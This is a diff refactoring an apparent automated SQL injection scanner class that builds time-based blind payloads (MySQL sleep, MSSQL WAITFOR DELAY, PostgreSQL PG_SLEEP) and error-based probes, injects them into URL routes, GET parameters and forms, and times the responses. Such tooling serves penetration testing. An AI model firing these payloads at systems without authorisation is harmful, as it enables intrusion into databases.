@@ -28,12 +28,13 @@ class SqliManager:
              'True2Pld': '"OR(if(2=2,sleep(5),0))OR"'},
             {'TruePld': '1\'; WAITFOR DELAY \'00:00:05', 'FalsePld': '1\'; WAITFOR DELAY \'00:00:00',
              'True2Pld': '1\'; WAITFOR DELAY \'00:00:08'},
-            {'TruePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(5)) OR \'', 'FalsePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(0)) OR \'',
+            {'TruePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(5)) OR \'',
+             'FalsePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(0)) OR \'',
              'True2Pld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(6)) OR \''},
         ]
         self._delay_in_seconds = 5
         self._request_handler = RequestHandler(cookies, headers)
-        self._injections_to_check = [' syntax', 'xpath', 'internalerror', 'warning: ', 'exception: ']
+        self._injections_to_check = [' syntax', 'xpath', 'internalerror', 'exception: ']
         self.errors_500 = []
         self._request_checker = RequestChecker()
 
@@ -46,8 +47,9 @@ class SqliManager:
             self._result: List[InjectionFoundDTO] = []
 
             thread_man = ThreadManager()
-            thread_man.run_all(self.__check_url, dtos, debug_msg='SqliManager/Get/Route')
-            thread_man.run_all(self.__check_get_params, dtos, debug_msg='SqliManager/Get/Params')
+            # thread_man.run_all(self.__check_url, dtos, debug_msg='SqliManager/Get/Route')
+            dtos_with_params = list([dto for dto in dtos if len(dto.query_params) > 0])
+            thread_man.run_all(self.__check_get_params, dtos_with_params, debug_msg='SqliManager/Get/Params')
 
             cache_manager.save_result(self._result, has_final_result=True)
 
@@ -135,23 +137,15 @@ class SqliManager:
                 print("METHOD TYPE NOT FOUND: " + form.method_type)
                 return
 
-    def __check_url(self, dto: GetRequestDTO):
+    def __get_route_time_based_payloads(self, url: str) -> List[List[str]]:
 
-        parsed = urllib.parse.urlparse(dto.url)
+        parsed = urllib.parse.urlparse(url)
         route_parts = [r for r in parsed.path.split('/') if r.strip()]
-        route_url_payloads = []
         route_time_based_payloads = []
         for index, part in enumerate(route_parts):
 
-            if self._request_checker.is_route_checked(dto.url, part):
+            if self._request_checker.is_route_checked(url, part):
                 continue
-
-            for payload in self._error_based_payloads:
-                payload_part = f'{part}{payload}'
-                new_route_parts = deepcopy(route_parts)
-                new_route_parts[index] = payload_part
-                new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
-                route_url_payloads.append(new_url)
 
             for payloads in self._time_based_payloads:
                 payload_part = f'{part}{payloads["TruePld"]}'
@@ -171,33 +165,47 @@ class SqliManager:
 
                 route_time_based_payloads.append([true_new_url, false_new_url, true2_new_url])
 
+        return route_time_based_payloads
+
+    def __check_url(self, dto: GetRequestDTO):
+
+        route_url_payloads = self._request_checker.get_route_payloads(dto.url, self._error_based_payloads)
+        route_time_based_payloads = self.__get_route_time_based_payloads(dto.url)
+
         for url in route_url_payloads:
             self.__send_error_based_request(url, dto)
 
         for payloads in route_time_based_payloads:
-            self.__send_time_based_request(payloads[0], payloads[1], payloads[2])
 
-    def __check_get_params(self, dto: GetRequestDTO):
-        error_based_payloads_urls = set()
+            if len(payloads) == 3:
+                self.__send_time_based_request(payloads[0], payloads[1], payloads[2])
+            else:
+                print(f'Error: ({dto.url}) time based payloads wrong generation')
+
+    def __get_time_based_param_payloads(self, url: str) -> set[tuple[str, str, str]]:
         time_based_payloads_urls = set()
-        parsed = urlparse.urlparse(dto.url)
+        parsed = urlparse.urlparse(url)
         params_key_values = filter(None, parsed.query.split("&"))
 
         for param_k_v in params_key_values:
 
-            if self._request_checker.is_get_param_checked(dto.url, param_k_v):
+            if self._request_checker.is_get_param_checked(url, param_k_v):
                 continue
 
             param_split = param_k_v.split('=')
-            main_url_split = dto.url.split(param_k_v)
+            main_url_split = url.split(param_k_v)
             for payloads in self._time_based_payloads:
                 time_based_payloads_urls.add(
                     (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                      f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}',
                      f'{main_url_split[0]}{param_split[0]}={payloads["True2Pld"]}{main_url_split[1]}'))
 
-            for payload in self._error_based_payloads:
-                error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')
+        return time_based_payloads_urls
+
+    def __check_get_params(self, dto: GetRequestDTO):
+
+        error_based_payloads_urls = self._request_checker.get_param_payloads(dto.url, self._error_based_payloads)
+        time_based_payloads_urls = self.__get_time_based_param_payloads(dto.url)
 
         for payload in error_based_payloads_urls:
             self.__send_error_based_request(payload, dto)
@@ -240,7 +248,8 @@ class SqliManager:
                             msg = f"SQLiManager delay FOUND! TRUE:{true_payload} ; FALSE:{false_payload}"
                             print(msg)
                             return self._result.append(
-                                InjectionFoundDTO(InjectionType.Sqli_Get_Time, true_payload, 'TIME_BASED', 'RESPONSE1 is NONE', msg))
+                                InjectionFoundDTO(InjectionType.Sqli_Get_Time, true_payload, 'TIME_BASED',
+                                                  'RESPONSE1 is NONE', msg))
 
     def __check_keywords(self, response, url_payload, inj_type: InjectionType,
                          post_payload=None,
@@ -262,7 +271,7 @@ class SqliManager:
                 substr_index = web_page.find(keyword)
                 start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                 last_index = substr_index + 50 if substr_index + 50 < len(web_page) else substr_index
-                details = web_page[start_index:last_index].replace('/n','').replace('/r','').strip()
+                details = web_page[start_index:last_index].replace('/n', '').replace('/r', '').strip()
                 log_header_msg = f'injFOUND: {keyword}; ' \
                                  f'URL: {url_payload}; ' \
                                  f'DETAILS: {details};'
@@ -321,10 +330,8 @@ class SqliManager:
                         response5 = self._request_handler.handle_request(url, post_data=copy_form_params)
                         t2 = datetime.now() - t1
                         if response5 is None and t2.total_seconds() >= self._delay_in_seconds:
-
                             msg = f"SqliManager FORM delay FOUND! TRUE:{payloads['TruePld']} ; FALSE:{payloads['FalsePld']}"
                             print(msg)
                             self._result.append(
                                 InjectionFoundDTO(InjectionType.Sqli_PostForm_Time, url, copy_form_params,
                                                   response2.text, msg))
-
